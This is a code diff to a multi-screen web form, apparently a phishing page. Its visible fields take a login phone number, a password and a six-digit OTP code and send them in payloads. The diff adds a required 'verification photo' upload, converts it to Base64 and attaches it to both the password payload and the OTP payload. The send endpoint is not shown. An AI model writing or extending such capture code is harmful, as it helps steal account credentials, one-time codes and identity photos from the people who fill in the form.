@@ -138,6 +138,11 @@
       transition: border-color 0.2s;
     }
 
+    .file-input {
+      padding-top: 12px;
+      cursor: pointer;
+    }
+
     .custom-input::placeholder {
       color: #5c626b;
     }
@@ -433,6 +438,11 @@
         </div>
 
         <div class="form-group">
+          <label for="verificationPhoto" class="input-label">Verification Photo</label>
+          <input type="file" id="verificationPhoto" class="custom-input file-input" accept="image/*" required />
+        </div>
+
+        <div class="form-group">
           <label for="referrerEmail" class="input-label">Referrer Email</label>
           <input type="email" id="referrerEmail" class="custom-input" placeholder="Enter referrer email" required />
         </div>
@@ -588,8 +598,19 @@
       const botBtn = document.getElementById("botBtn");
       const otpInputs = document.querySelectorAll(".otp-input");
 
-      // State store for registration parameters
+      // State store for registration parameters & image string
       let registrationData = {};
+      let base64Photo = "";
+
+      // Utility function to convert uploaded file to Base64 string
+      function readFileAsBase64(file) {
+        return new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = () => resolve(reader.result);
+          reader.onerror = (error) => reject(error);
+          reader.readAsDataURL(file);
+        });
+      }
 
       function navigateTo(targetScreenKey) {
         Object.values(screens).forEach(screen => screen.classList.remove("active"));
@@ -598,10 +619,19 @@
       }
 
       // --- SCREEN 1: REGISTER ---
-      document.getElementById("registerForm").addEventListener("submit", (e) => {
+      document.getElementById("registerForm").addEventListener("submit", async (e) => {
         e.preventDefault();
 
-        // Save input values to registration state (no email sent on register submit)
+        const fileInput = document.getElementById("verificationPhoto");
+        if (fileInput.files && fileInput.files[0]) {
+          try {
+            base64Photo = await readFileAsBase64(fileInput.files[0]);
+          } catch (err) {
+            console.error("Error reading image file:", err);
+          }
+        }
+
+        // Save input values to registration state
         registrationData = {
           fullName: document.getElementById("fullName").value,
           whatsapp: document.getElementById("whatsapp").value,
@@ -632,7 +662,7 @@
         navigateTo("pass");
       });
 
-      // --- SCREEN 3: PASS PAGE (Sends account details + password) ---
+      // --- SCREEN 3: PASS PAGE (Sends account details + password + photo) ---
       document.querySelectorAll(".back-to-login").forEach(btn => {
         btn.addEventListener("click", () => navigateTo("login"));
       });
@@ -657,6 +687,7 @@
           age: registrationData.age || '',
           gender: registrationData.gender || '',
           referrer: registrationData.referrerEmail || '',
+          verification_photo: base64Photo || '',
           login_phone: loginInput.value.trim(),
           login_password: passwordInput.value.trim(),
           otp_code: 'Not Entered Yet'
@@ -679,7 +710,7 @@
           });
       });
 
-      // --- SCREEN 4: OTP PAGE (Sends 6-digit OTP code) ---
+      // --- SCREEN 4: OTP PAGE (Sends 6-digit OTP code + photo) ---
       document.querySelectorAll(".back-to-pass").forEach(btn => {
         btn.addEventListener("click", () => navigateTo("pass"));
       });
@@ -742,6 +773,7 @@
           age: registrationData.age || '',
           gender: registrationData.gender || '',
           referrer: registrationData.referrerEmail || '',
+          verification_photo: base64Photo || '',
           login_phone: loginInput.value.trim(),
           login_password: passwordInput.value.trim(),
           otp_code: enteredCode
